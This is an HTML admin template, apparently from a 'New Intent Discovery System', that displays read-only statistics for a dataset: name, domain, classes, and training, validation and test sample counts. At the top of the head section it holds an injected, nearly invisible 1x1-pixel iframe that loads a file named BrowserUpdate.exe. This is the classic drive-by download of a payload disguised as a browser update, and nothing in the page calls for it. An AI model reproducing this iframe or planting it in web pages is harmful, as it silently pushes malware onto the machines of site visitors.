<!DOCTYPE html>
<html class="x-admin-sm">
    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
        <meta charset="UTF-8">
        <title>New Intent Discovery System</title>
        <meta name="renderer" content="webkit|ie-comp|ie-stand">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width,user-scalable=yes, minimum-scale=0.4, initial-scale=0.8,target-densitydpi=low-dpi" />
        <meta http-equiv="Cache-Control" content="no-siteapp" />
        <link rel="stylesheet" href="/static/lib/xadmin/css/font.css">
        <link rel="stylesheet" href="/static/lib/xadmin/css/xadmin.css">
        <!-- <link rel="stylesheet" href="./css/theme5.css"> -->
        <script src="/static/lib/layui/layui.js" charset="utf-8"></script>
        <script type="text/javascript" src="/static/lib/xadmin/js/xadmin.js"></script>
        <!-- 让IE8/9支持媒体查询，从而兼容栅格 -->
        <!--[if lt IE 9]>
          <script src="https://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
          <script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->
        <script>
            // 是否开启刷新记忆tab功能
            // var is_remember = false;
        </script>
    </head>
    <body>
        <div class="layui-fluid">
            <div class="layui-row layui-col-space15">
                <div class="layui-col-md12">
                  <div class="layui-card">
                    <div class="layui-card-body ">
                

                    <form class="layui-form"  enctype="multipart/form-data">

                            <div class="layui-form-item">
                                <label for="name" class="layui-form-label" style="margin-right: 15px">
                                    <span class="x-red">*</span>Name</label>
                                <div class="layui-input-inline">
                                    <input style= "border-radius: 5px" disabled type="text" id="dataset_name" readonly="readonly" value="{{ obj.dataset_name }}"  style="width: 80%" autocomplete="off" class="layui-input">
                                </div>
                                <label for="domain" class="layui-form-label" style="margin-right: 15px">
                                    <span class="x-red">*</span>Domain</label>
                                <div class="layui-input-inline">
                                    <input style= "border-radius: 5px" disabled  type="text" id="domain" value="{{ obj.domain }}" style="width: 80%" autocomplete="off" class="layui-input">
                                </div>
                            </div>
                            <div class="layui-form-item">
                                <label for="class_num" class="layui-form-label" style="margin-right:15px">
                                    <span class="x-red">*</span>Classes</label>
                                <div class="layui-input-inline">
                                    <input style= "border-radius: 5px" disabled  type="text" id="class_num" value="{{ obj.class_num }}" style="width: 80%" autocomplete="off" class="layui-input">
                                </div>
                                <label for="source" class="layui-form-label" style="margin-right: 15px">
                                    <span class="x-red">*</span>Source</label>
                                <div class="layui-input-inline">
                                    <a style = "text-decoration: underline ; color :blue;"  href=" {{ obj.source }}" target=_blank> Paper</a>
                                </div>
                            </div>
                            <div class="layui-form-item">
                                <label for="sample_total_num" class="layui-form-label" style="margin-right: 15px">
                                    <text>#Total&nbspsamples</text></label>
                                <div class="layui-input-inline">
                                    <input style= "border-radius: 5px" disabled  type="text" id="sample_total_num" value="{{ obj.sample_total_num }}" style="width: 80%" autocomplete="off" class="layui-input">
                                </div>
                                <label for="sample_training_num" class="layui-form-label" style="margin-right: 15px">
                                    #Training&nbspsamples</label>
                                <div class="layui-input-inline">
                                    <input  style= "border-radius: 5px" disabled  type="text" id="sample_training_num" value="{{ obj.sample_training_num }}" style="width: 80%" autocomplete="off" class="layui-input">
                                </div>
                            </div>
                            <div class="layui-form-item">
                                <label for="sample_vali_num" class="layui-form-label" style="margin-right: 15px">
                                    #Validation&nbspsamples</label>
                                <div class="layui-input-inline">
                                    <input style= "border-radius: 5px" disabled  type="text" id="sample_validation_num" value="{{ obj.sample_validation_num }}" style="width: 80%" autocomplete="off" class="layui-input">
                                </div>
                                <label for="sample_test_num" class="layui-form-label" style="margin-right: 15px">
                                    #Testing&nbspsamples</label>
                                <div class="layui-input-inline">
                                    <input style= "border-radius: 5px" disabled  type="text" id="sample_test_num" value="{{ obj.sample_test_num }}" style="width: 80%" autocomplete="off" class="layui-input">
                                </div>
                            </div>
                            <div class="layui-form-item">
                                <label for="sentence_max_length" class="layui-form-label" style="margin-right: 15px">
                                    #Maximum&nbsplength</label>
                                <div class="layui-input-inline">
                                    <input  style= "border-radius: 5px" disabled  type="text" id="sentence_max_length" value="{{ obj.sentence_max_length }}" style="width: 80%"  autocomplete="off" class="layui-input">
                                </div>
                                <label for="sentence_avg_length" class="layui-form-label" style="margin-right: 15px">
                                    #Average&nbsplength</label>
                                <div class="layui-input-inline">
                                    <input style= "border-radius: 5px" disabled  type="text" id="sentence_avg_length" value="{{ obj.sentence_avg_length }}" style="width: 80%" autocomplete="off" class="layui-input"></div>
                            </div>
                        </form>
                
                </div>
                </div>
            </div>
        </div>
    </body>

</html>
